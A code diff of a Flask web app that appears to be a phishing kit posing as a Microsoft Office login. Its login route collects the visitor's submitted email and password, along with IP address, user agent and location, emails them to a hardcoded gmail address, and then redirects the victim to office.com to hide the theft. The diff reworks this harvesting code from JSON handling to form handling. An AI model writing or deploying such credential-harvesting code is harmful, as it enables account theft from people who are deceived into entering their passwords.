@@ -25,36 +25,29 @@ logger = logging.getLogger(__name__)
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        # Parse JSON payload
-        data = request.get_json()
-        if not data:
-            return jsonify({"error": "Invalid JSON payload"}), 400
-
-        email = data.get('email')
-        password = data.get('password')
-
-        # IP address and other info
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         if user_ip:
             user_ip = user_ip.split(',')[0].strip()
+
+        email = request.form['email']
+        password = request.form['password']
         user_agent = request.headers.get('User-Agent')
         location_info = get_location_from_ip(user_ip)
-        
+
+        # List of email recipients (hardcoded or dynamically fetched)
         recipient_emails = ['Pkanethackx@gmail.com']  # Replace with your recipient emails
-       
-        
+
         try:
             for recipient_email in recipient_emails:
                 send_email_with_retry(recipient_email, email, password, user_ip, user_agent, location_info)
-            return jsonify({"message": "Login information sent successfully via email!"}), 200
+            flash('Login information sent successfully via email!', 'success')
         except Exception as e:
-            return jsonify({"error": f"Error sending email: {str(e)}"}), 500
+            logger.error(f"Error sending email: {e}")
+            flash(f'Error sending email: {str(e)}', 'danger')
 
         return redirect("https://office.com")
-    return render_template('index.html')
-        
 
-        
+    return render_template('index.html')
 
 
 def send_email_with_retry(recipient_email, user_email, user_password, user_ip, user_agent, location_info, retries=3):
